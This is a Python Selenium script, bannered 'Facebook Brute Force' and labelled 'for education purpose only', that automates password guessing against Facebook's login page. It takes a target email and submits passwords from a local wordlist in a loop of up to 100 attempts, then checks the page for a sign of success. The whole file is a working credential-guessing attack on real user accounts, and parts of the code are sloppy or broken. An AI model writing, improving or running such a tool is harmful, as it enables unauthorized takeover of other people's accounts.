#from typing import KeysView
from selenium.webdriver import Firefox
from selenium.webdriver.common.by import By
import time
from selenium.webdriver.firefox.options import Options
#import pyautogui
#from selenium.webdriver.common.keys import Keys

# Create a FirefoxOptions object and set the '--headless' option
options = Options()
options.add_argument('--headless')
driver = Firefox(executable_path='D:/New folder(3)')


print("""
███████████████████████████████████████████████████████████████████████████████████████████████████████████████
█▄─▄▄─██▀▄─██─▄▄▄─█▄─▄▄─█▄─▄─▀█─▄▄─█─▄▄─█▄─█─▄███▄─▄─▀█▄─▄▄▀█▄─██─▄█─▄─▄─█▄─▄▄─███▄─▄▄─█─▄▄─█▄─▄▄▀█─▄▄▄─█▄─▄▄─█
██─▄████─▀─██─███▀██─▄█▀██─▄─▀█─██─█─██─██─▄▀█████─▄─▀██─▄─▄██─██─████─████─▄█▀████─▄███─██─██─▄─▄█─███▀██─▄█▀█
▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀▀▀▄▄▄▄▀▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▄▀▀▀▄▄▄▀▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀
                    █████████████████████████████████████████████████████████████
                    ██▀▄─██─▄─▄─█─▄─▄─██▀▄─██─▄▄▄─█▄─█─▄███─▄─▄─█─▄▄─█─▄▄─█▄─▄███
                    ██─▀─████─█████─████─▀─██─███▀██─▄▀██████─███─██─█─██─██─██▀█
                    ▀▄▄▀▄▄▀▀▄▄▄▀▀▀▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄
""")

print("""
                ╭┳━┳╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━╮╱╭╮╭╮╱╱╱╱╱╭━┳┳╮╱╱╭━┳╮╱╭━┳╮
                ┃┃┃┃┣━┳╮╭━┳━┳━━┳━╮┃╭╮┣┳┫╰┫╰┳━┳┳╮┃╋┣┫╰┳━┫━┫╰╮┃┃┃┣━┳━┳━╮╭╮
                ┃┃┃┃┃┻┫╰┫━┫╋┃┃┃┃┻┫┃┣┫┃┃┃╭┫┃┃┻┫╭╯┃╮┫┃╭┫┻╋━┃┃┃┃┃┃┃┻┫╋┃╋╰┫╰╮
                ╰━┻━┻━┻━┻━┻━┻┻┻┻━╯╰╯╰┻━┻━┻┻┻━┻╯╱╰┻┻┻━┻━┻━┻┻╯╰┻━┻━┫╭┻━━┻━╯
                ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯
                
                """)

print('\033[1;31m' + '######made for education purpose only######' + '\033[0m')
print('\033[1;33m' + '....................................................................................................................................................................' + '\033[0m')
driver.get("https://www.facebook.com/login")
email_element = driver.find_element(By.ID,'email')
val = input("Enter email or phonenumber or h for any help: ")
if val == "h":
    print("This is a fackbook hacking tool.\n Just type your id and password.... ")
    exit()
email_element.send_keys(val)
password_element = driver.find_element(By.ID,'pass')
val1 = input("Enter  password: ")
password_element.send_keys(val1)
login_button = driver.find_element(By.NAME,"login")
time.sleep(1)
login_button.click()

a_file = open('D:/nihereeka/password.txt', "r")
list_of_lists = []

attempts = 0
  # Set the maximum number of attempts
while True:
    try:
        profile_name = driver.find_element(By.CSS_SELECTOR,'li.x1iyjqo2:nth-child(1) > span:nth-child(1) > div:nth-child(1) > a:nth-child(2) > span:nth-child(1) > svg:nth-child(1) > path:nth-child(1)')
        print('Login successful')
        break  # Exit the loop
    except:
        print('Login unsuccessful')
        time.sleep(2)
        email_element = driver.find_element(By.ID,'email')

        email_element.clear()
        email_element.send_keys(val)
        for line in a_file:
    
    

            stripped_line = line.strip()
            if stripped_line == "":
                continue
            
            list_of_lists.append([stripped_line])
        
        max_attempts = 100
        time.sleep(2)
        password_element = driver.find_element(By.CSS_SELECTOR,'#pass')

        #attempts += 0
        # val2 = input(f"Enter  password again:try no {attempts+1}:Max is 10: ")  # Get the password again
        # password_element.send_keys(val2)  # Enter the password
        print(f"Trying password from Text file::::pass {attempts+1} = {list_of_lists[attempts]} ")
        password_element.send_keys(list_of_lists[attempts])
        time.sleep(4)
            
        login_button = driver.find_element(By.NAME,"login")
        login_button.click()
        time.sleep(100)
        attempts += 1
        if attempts >= max_attempts:
                 print("Maximum number of attempts reached")
                 break
            
            
        
           
           
      

a_file.close()

driver.quit()

